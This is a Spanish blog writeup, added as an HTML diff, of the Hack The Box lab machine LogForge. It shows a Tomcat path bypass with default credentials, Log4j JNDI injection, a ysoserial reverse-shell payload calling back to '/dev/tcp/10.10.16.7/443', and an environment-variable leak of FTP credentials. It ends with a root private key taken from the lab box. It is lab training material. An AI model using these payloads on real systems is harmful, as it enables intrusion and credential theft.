@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada LogForge de Hack The Box (Necesario VIP) | Blog de Hacking</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada LogForge de Hack The Box (Necesario VIP)" />
+<meta name="author" content="K0Hack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j" />
+<link rel="canonical" href="http://localhost:4000/2021/12/30/LogForge-Log4j-Vuln.html" />
+<meta property="og:url" content="http://localhost:4000/2021/12/30/LogForge-Log4j-Vuln.html" />
+<meta property="og:site_name" content="Blog de Hacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-30T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada LogForge de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K0Hack"},"dateModified":"2021-12-30T00:00:00-03:00","datePublished":"2021-12-30T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j","headline":"Maquina Retirada LogForge de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/12/30/LogForge-Log4j-Vuln.html"},"url":"http://localhost:4000/2021/12/30/LogForge-Log4j-Vuln.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Blog de Hacking" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Blog de Hacking<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Retirada LogForge de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/Log4j,/">Log4j,</a>
+      
+      <a class="tag" href="/tag/Tomcat,/">Tomcat,</a>
+      
+      <a class="tag" href="/tag/LDAP/">LDAP</a>
+      
+      <a class="tag" href="/tag/Injection,/">Injection,</a>
+      
+      <a class="tag" href="/tag/Ysoserial,/">Ysoserial,</a>
+      
+      <a class="tag" href="/tag/RCE,/">RCE,</a>
+      
+      <a class="tag" href="/tag/JNDI,/">JNDI,</a>
+      
+      <a class="tag" href="/tag/Web/">Web</a>
+      
+      <a class="tag" href="/tag/Hacking,/">Hacking,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup/">Writeup</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 30 Dec 2021</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada LOGFORGE que presenta la famosa Vuln Log4j</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="logforge-log4j---hack-the-box">LogForge Log4j - Hack The Box</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.11.138       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -sC -sV -p -oN target 10.10.11.138
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Ultimate Hacking Championship
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div>
+<p>Lanzamos la herramienta Whatweb</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.11.138 <span class="o">[</span>200 OK] Apache[2.4.41], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, HttpOnly[JSESSIONID], IP[10.10.11.138], Java, Title[Ultimate Hacking Championship]
+</code></pre></div></div>
+<p>Hechamos un vistazo a web.</p>
+
+<p>Encontramos un Tomcat Corriendo..</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hacemos uso de la vulnerabilidad presente en Tomcat añadiendo este parametro en la Url para saltarnos el login ../..<span class="p">;</span>/manager/
+
+http://10.10.11.138/pepe/..<span class="p">;</span>/manager/html  → password por Default              tomcat:tomcat
+</code></pre></div></div>
+<h1 id="log4j-injection---tomcat-manager">Log4j Injection - Tomcat ..;/manager/</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>en el campo Applicattion /  → procedemos a hacer la comprobacion <span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.16.7/LoqueSeaaa<span class="k">}</span> y procedemos a ponernos a la escucha con nc
+</code></pre></div></div>
+<p>Primer Payload De Comprobacion</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.16.7:9001/LoqueSeaa<span class="k">}</span>
+</code></pre></div></div>
+<p>Recursos que necesitamos – Procedemos a clonarnos los siguientes dos Repositorios de Github:</p>
+<ul>
+  <li>YsoSerial - Modified → https://github.com/pimps/ysoserial-modified/tree/master/target  → Servira para crear nuestro Payload</li>
+  <li>JNDI-Exploit-Kit –→ https://github.com/pimps/JNDI-Exploit-Kit  → para Montarnos un server con LDAP para ofrecerle nuestro Payload creado con Ysoserial - Modified</li>
+</ul>
+
+<p>Procedemos a meternos en el recurso descargado de Ysoserial-Modified y sobre el archivo  <code class="language-plaintext highlighter-rouge">ysoserial-modified.jar</code> le metemos el <code class="language-plaintext highlighter-rouge">COmmonsColloctions5 bash</code> y le metemos nuestro comando
+para crear nuestro payload <code class="language-plaintext highlighter-rouge">setenso.ser</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java <span class="nt">-jar</span> ysoserial-modified.jar CommonsCollections5 bash <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1'</span> <span class="o">&gt;</span> setenso.ser
+</code></pre></div></div>
+<p>Procedemos a montar con el KIT-JNDI-Injection-Exploit y el archivo <code class="language-plaintext highlighter-rouge">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code> a montarnos el server LDAP y pasarle nuestro payload</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java <span class="nt">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="nt">-L</span> 10.10.16.7:1389 <span class="nt">-P</span> /home/pro/Escritorio/HTB/LogForge/exploits/yso/setenso.ser
+       _ _   _ _____ _____      ______            _       _ _          _  ___ _   
+      | | <span class="se">\ </span>| |  __ <span class="se">\_</span>   _|    |  ____|          | |     <span class="o">(</span>_<span class="o">)</span> |        | |/ <span class="o">(</span>_<span class="o">)</span> |  
+      | |  <span class="se">\|</span> | |  | <span class="o">||</span> |______| |__  __  ___ __ | | ___  _| |_ ______| <span class="s1">' / _| |_ 
+  _   | | . ` | |  | || |______|  __| \ \/ / '</span>_ <span class="se">\|</span> |/ _ <span class="se">\|</span> | __|______|  &lt; | | __|
+ | |__| | |<span class="se">\ </span> | |__| <span class="o">||</span> |_     | |____ <span class="o">&gt;</span>  &lt;| |_<span class="o">)</span> | | <span class="o">(</span>_<span class="o">)</span> | | |_       | <span class="nb">.</span> <span class="se">\|</span> | |_ 
+  <span class="se">\_</span>___/|_| <span class="se">\_</span>|_____/_____|    |______/_/<span class="se">\_\ </span>.__/|_|<span class="se">\_</span>__/|_|<span class="se">\_</span>_|      |_|<span class="se">\_\_</span>|<span class="se">\_</span>_|
+                                           | |                                    
+                                           |_|               created by @welk1n 
+                                                             modified by @pimps 
+
+<span class="o">[</span>HTTP_ADDR] <span class="o">&gt;&gt;</span> 10.10.16.7
+<span class="o">[</span>RMI_ADDR] <span class="o">&gt;&gt;</span> 10.10.16.7
+<span class="o">[</span>LDAP_ADDR] <span class="o">&gt;&gt;</span> 10.10.16.7
+<span class="o">[</span>COMMAND] <span class="o">&gt;&gt;</span> open /System/Applications/Calculator.app
+<span class="nt">----------------------------JNDI</span> Links---------------------------- 
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK 1.7 whose trustURLCodebase is <span class="nb">true</span><span class="o">)</span>:
+rmi://10.10.16.7:1099/xz8ibv
+ldap://10.10.16.7:1389/xz8ibv
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK 1.8 whose trustURLCodebase is <span class="nb">true</span><span class="o">)</span>:
+rmi://10.10.16.7:1099/8fevaq
+ldap://10.10.16.7:1389/8fevaq
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK 1.6 whose trustURLCodebase is <span class="nb">true</span><span class="o">)</span>:
+rmi://10.10.16.7:1099/dbyqtd
+ldap://10.10.16.7:1389/dbyqtd
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK 1.5 whose trustURLCodebase is <span class="nb">true</span><span class="o">)</span>:
+rmi://10.10.16.7:1099/ez03wo
+<span class="s2">"ldap://10.10.16.7:1389/ez03wo"</span>
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK - <span class="o">(</span>BYPASS WITH EL by @welk1n<span class="o">)</span> whose trustURLCodebase is <span class="nb">false </span>and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="k">in </span>classpath<span class="o">)</span>:
+rmi://10.10.16.7:1099/ktgct2
+Target environment<span class="o">(</span>Build <span class="k">in </span>JDK - <span class="o">(</span>BYPASS WITH GROOVY by @orangetw<span class="o">)</span> whose trustURLCodebase is <span class="nb">false </span>and have Tomcat 8+ and Groovy <span class="k">in </span>classpath<span class="o">)</span>:
+rmi://10.10.16.7:1099/hbyhk1
+
+<span class="nt">----------------------------Server</span> Log----------------------------
+2021-12-29 18:27:42 <span class="o">[</span>JETTYSERVER]&gt;&gt; Listening on 10.10.16.7:8180
+2021-12-29 18:27:42 <span class="o">[</span>RMISERVER]  <span class="o">&gt;&gt;</span> Listening on 10.10.16.7:1099
+2021-12-29 18:27:42 <span class="o">[</span>LDAPSERVER] <span class="o">&gt;&gt;</span> Listening on 0.0.0.0:1389
+</code></pre></div></div>
+
+<p>Estando nuestro server con ldap ya activo procedemos a montar el Payload OS Injecction a ejecutar con la direccion que nos pone ahi por LDAP</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.16.7:1389/ez03wo<span class="k">}</span> y lo injectamos en el mismo campo que antes y recibimos la session por abajo.
+</code></pre></div></div>
+<p>Al injectar el comando anterior en el campo comentado vemos como se envia nuestro Payload</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------------------------Server</span> Log----------------------------
+2021-12-29 18:27:42 <span class="o">[</span>JETTYSERVER]&gt;&gt; Listening on 10.10.16.7:8180
+2021-12-29 18:27:42 <span class="o">[</span>RMISERVER]  <span class="o">&gt;&gt;</span> Listening on 10.10.16.7:1099
+2021-12-29 18:27:42 <span class="o">[</span>LDAPSERVER] <span class="o">&gt;&gt;</span> Listening on 0.0.0.0:1389
+2021-12-29 18:32:21 <span class="o">[</span>LDAPSERVER] <span class="o">&gt;&gt;</span> Send LDAP object with serialized payload: ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696
+275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E
+457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C6
+16E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A617661
+2F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E000
+8707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000037372001B6A6176612E6C616E672E537461636B54
+72616365456C656D656E746109C59A2636DD85020008420006666F726D617449000A6C696E654E756D6265724C000F636C6173734C6F616465724E616D6571007E00054C000E64656
+36C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E00054C000A6D6F64756C654E616D6571007E00054C000D6D
+6F64756C6556657273696F6E71007E00057870010000004A74000361707074002679736F73657269616C2E7061796C6F6164732E436F6D6D6F6E73436F6C6C656374696F6E7335740
+018436F6D6D6F6E73436F6C6C656374696F6E73352E6A6176617400096765744F626A65637470707371007E000B010000002C71007E000D71007E000E71007E000F71007E00107070
+7371007E000B010000003171007E000D74001979736F73657269616C2E47656E65726174655061796C6F616474001447656E65726174655061796C6F61642E6A6176617400046D616
+96E70707372001F6A6176612E7574696C2E436F6C6C656374696F6E7324456D7074794C6973747AB817B43CA79EDE020000787078737200346F72672E6170616368652E636F6D6D6F
+6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B657971007E00014C00036D617074000F4C6A6176612
+F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E79109403
+00014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616
+368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F
+726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E6
+36F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636
+F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E0001787076720011
+6A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F7273
+2E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D6
+571007E00055B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F107329
+6C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F
+647571007E002F00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E002F7371007E00287571007E002C00000002707571007E00
+2C00000000740006696E766F6B657571007E002F00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E002C7371007E00287571007
+E002C00000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000037400092F62696E2F626173687400022D6374002762617368202
+D69203E26202F6465762F7463702F31302E31302E31362E372F34343320303E2631740004657865637571007E002F000000017671007E00407371007E0024737200116A6176612E6C
+616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A
+6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000000770800000010000000007878
+</code></pre></div></div>
+
+<p>Session a la escucha con nc</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>root💀pro<span class="o">)</span>-[/home/pro]
+└─# nc <span class="nt">-vlnp</span> 443 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.7] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.138] 40992
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>787<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+tomcat@LogForge:/var/lib/tomcat9<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>– Intrusion Completada – Entramos como el User - Tomcat</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>Procedemos a enumerar el servidor para ver si hay alguna cosita interesante a nivel de la misma.. 
+Cuando hacemos el comando ` ps -aux ` para listar los comandos ejecutados a nivel de sistema encontramos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root         981  0.0  0.0   7244  3360 ?        S    19:17   0:00 /usr/sbin/CRON <span class="nt">-f</span>
+root         990  0.0  0.0   2608   604 ?        Ss   19:17   0:00 /bin/sh <span class="nt">-c</span> /root/run.sh
+root         992  0.0  0.0   5648  3156 ?        S    19:17   0:00 /bin/bash /root/run.sh
+root         993  0.3  1.8 3576972 76540 ?       Sl   19:17   0:01 java <span class="nt">-jar</span> /root/ftpServer-1.0-SNAPSHOT-all.jar
+</code></pre></div></div>
+<p>Identificamos que corre el servicio FTP internamente y que corre Java por detras, en el cual nos dan la imagen ftpServer-1.0-SNAPSHOP-all.jar en la raiz del equipo para analizar a bajo nivel que esta ocurriendo por detras, y vemos que se listan las variables de entorno <code class="language-plaintext highlighter-rouge">fpt_user y ftp_password </code></p>
+
+<p>Tal que podriamos intentar hacer una injeccion y recibir las variables de FTP atraves de la interceptacion del trafico con la herramienta <code class="language-plaintext highlighter-rouge">Wireshark</code> filtrando por <code class="language-plaintext highlighter-rouge">tcp.port == 1389</code> y haciendo un <code class="language-plaintext highlighter-rouge">Seguimiento al flujo de datos</code> para listar el <code class="language-plaintext highlighter-rouge">usuario ftp y su password</code></p>
+
+<p>Injeccion → Teniendo nuestro server con ldap montado podriamos probar a injecctar algo como esto para ver si podemos listar las variables nombradas anteriormente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.16.7:1389/<span class="k">${</span><span class="nv">env</span>:ftp_password<span class="k">}}</span>	
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@LogForge:/tmp<span class="nv">$ </span>ftp localhost
+Connected to localhost.
+220 Welcome to the FTP-Server
+Name <span class="o">(</span>localhost:tomcat<span class="o">)</span>: <span class="k">${</span><span class="nv">jndi</span>:ldap://10.10.16.7:1389/<span class="k">${</span><span class="nv">env</span>:ftp_password<span class="k">}}</span>
+530 Not logged <span class="k">in
+</span>Login failed.
+Remote system <span class="nb">type </span>is FTP.
+</code></pre></div></div>
+<p>Donde vemos que recibimos la password del Servicio FTP atraves de Wireshark en texto claro</p>
+
+<p>Archivo de Credenciales FTP</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user <span class="nt">--</span><span class="o">&gt;</span> ftp_user: ippsec
+pass <span class="nt">--</span><span class="o">&gt;</span> ftp_password: log4j_env_leakage 
+</code></pre></div></div>
+<p>Ahora podriamos conectarnos al servicio FTP interno con las credenciales obtenidas y como vemos estariamos como root y podriamos visualizar la flag y todos los archivos a nivel Admministrador por FTP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@LogForge:/tmp<span class="nv">$ </span>ftp localhost
+Connected to localhost.
+220 Welcome to the FTP-Server
+Name <span class="o">(</span>localhost:tomcat<span class="o">)</span>: ippsec
+331 User name okay, need password
+Password:
+230-Welcome to HKUST
+230 User logged <span class="k">in </span>successfully
+Remote system <span class="nb">type </span>is FTP.
+ftp&gt; <span class="nb">dir
+</span>200 Command OK
+125 Opening ASCII mode data connection <span class="k">for </span>file list.
+.profile
+.ssh
+snap
+ftpServer-1.0-SNAPSHOT-all.jar
+.bashrc
+.selected_editor
+run.sh
+.lesshst
+.bash_history
+root.txt
+.viminfo
+.cache
+226 Transfer complete.
+
+ftp&gt; get root.txt
+<span class="nb">local</span>: root.txt remote: root.txt
+200 Command OK
+150 Opening ASCII mode data connection <span class="k">for </span>requested file root.txt
+WARNING! 1 bare linefeeds received <span class="k">in </span>ASCII mode
+File may not have transferred correctly.
+226 File transfer successful. Closing data connection.
+33 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>78.9867 kB/s<span class="o">)</span>
+
+ftp&gt; <span class="nb">cd</span> .ssh
+250 The current directory has been changed to /root/.ssh
+ftp&gt; get id_rsa
+<span class="nb">local</span>: id_rsa remote: id_rsa
+200 Command OK
+150 Opening ASCII mode data connection <span class="k">for </span>requested file id_rsa
+WARNING! 28 bare linefeeds received <span class="k">in </span>ASCII mode
+File may not have transferred correctly.
+226 File transfer successful. Closing data connection.
+1680 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>404.9926 kB/s<span class="o">)</span>
+</code></pre></div></div>
+<p>Procedemos a visualizar los recursos descargador en el directorio /tmp/</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@LogForge:/tmp<span class="nv">$ </span><span class="nb">ls
+</span>hsperfdata_tomcat  id_rsa  root.txt
+
+tomcat@LogForge:/tmp<span class="nv">$ </span><span class="nb">cat </span>root.txt 
+bc4fe3cd9e92b620cbd13exxxxxxxxxxxxxx
+
+tomcat@LogForge:/tmp<span class="nv">$ </span><span class="nb">cat </span>id_rsa 
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA6rJ1Y88QDL/MLtv+Ml8TwH7JSWxNIc8/8GeEa3OkWzv9z4cv
+5owDnHv5s9m80fREmO6fjqELVM1A/dRWLsatIHJuyNmrTQ/viJTPopCBBdjG3rpQ
+74Ng5OQc7KxVHU7qtrCgYXJ8t8FJdT/456halp2neOOqqWUjTx8JeM9v9x1ku09P
+omAXyBcq2bx+EyUlwJr+0tMUDCWzdLH/+iXVwuTudx9RegOk2Q3IHlTnj1UhWkDk
+SVjwudGzHn7AyyNjc1ISrcWnBtYNKwGkyXp61wnQ/Lx3+QdKVFfgBzoxaA6fsDzs
+LftTgYa7skTgTGrVJIY2rEktS4To6MQjYEvSnQIDAQABAoIBAAqGZENMluCrfUGg
+tf6WSvF3/hjf1XmtrKVgTwzui7FXuGMlId3J66OJ38HUAua7eJQPJ3KjADoWVlLL
+we2pFTx+RT+Wm1sCWvCaE9Grf02+0fRNELIdByxcmnt2ov6Eenwk4ZxdIQCwl1W9
+v7DL2PwmJ8uBEjc0hOfYcXlMfC3tuomWX1RK75SIMMFI1NbRKXyo4zGpdPhjiwVq
+4nZKuYapfcpxus/7m/ChEETrmdZ+iYn2wwQ3Quu9HKRGCZDx+sKBWQSdZMmTdqkR
+wc0Xmfoxkqb+2NxD8zLfcHsf1fEJt+y0wcWf/B20oPlyuasHjEhzxehAUlV+i4XB
+zB6UeoECgYEA9ZBxRLCHbb4A4d5Ca2DI0Xi6rcSPJYOrDLYBLS2bO3JyVcqbUbwr
+rzy7XLG/8l81htsMDBe7M2HhTv6zBpAzL8D3ru5DCd+ASVJsngl/Qn0R1jxlaXLf
+yGKS1axZ3eJyOdG0ud00BYPbXBYDRWp+nA3SQIcVAGTychWR6EanzP0CgYEA9KvK
+MLCrSzqfzEtjPat6s8NFSI8JQWIFdcutb9U8T85mMCd2NtEOlKSCbEvt00vKPP17
+UFAUGkixYabV7sF3loSdJza4aM53dC+mdWK+luCr3RYYLgvKAQuViacQqdp68/yc
+XPalxxxx3Y6FGdCoQRouqQ5GgOKpuDbQ29yz3iECgYEAuH4a+3Z9aU/1Lb1kvXPr
+rKU968vfmFnCKzyayayYEiO8DwS3iMMNNw0z30KUaa5qcrUj6fnyZXpGYqktK+Mu
+8dPSwpSzvTk0EuJgRKPx/qwkuIaL0pvB0bVtiCeDJRc6poINfA7bRMF6D0dikcae
+9PPVYTGb773oARp/krly3KkCgYEA7s1hKYa1mVZds0r9UKq2tw9m5vvcf7lJNQCX
+hehs1kPQTz2kzrna7k9mkIbHWAzIFiEdo3SVOlYq8vGgKkkgDIPg0u5ArOKfioIb
+iMTY2m/srnurG/4bqkuBJ3os9GsuyEaM4ttFEsUoimlZFaonHmuMkSpCu/b+ybKO
+xZiy4aECgYBXh3aZHQCaPxBbhC8yqBjATQn+k9dDrh/PDawW1flXsnyU+pfmYlpy
+hr+/FHRFPDPC4Fu3AHmk8//Xvuf3FDLj9n758hJ+R9Gq2fkesvcZ8xvfQHjr/nla
+xAziiX8mpKJQnqyusg/P/J8r/O2DAObRxaQd7k4oiqQ0lEWjqBVtYA<span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Maquina LogForge ~ Vulnerabilidad Log4j ~ Tomcat - FtpServer ~ by HTB</td>
+      <td> </td>
+      <td>H4cked K0H4ck</td>
+    </tr>
+  </tbody>
+</table>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/12/30/LogForge-Log4j-Vuln.html';
+     this.page.identifier = '/2021/12/30/LogForge-Log4j-Vuln';
+     this.page.title = 'Maquina Retirada LogForge de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a 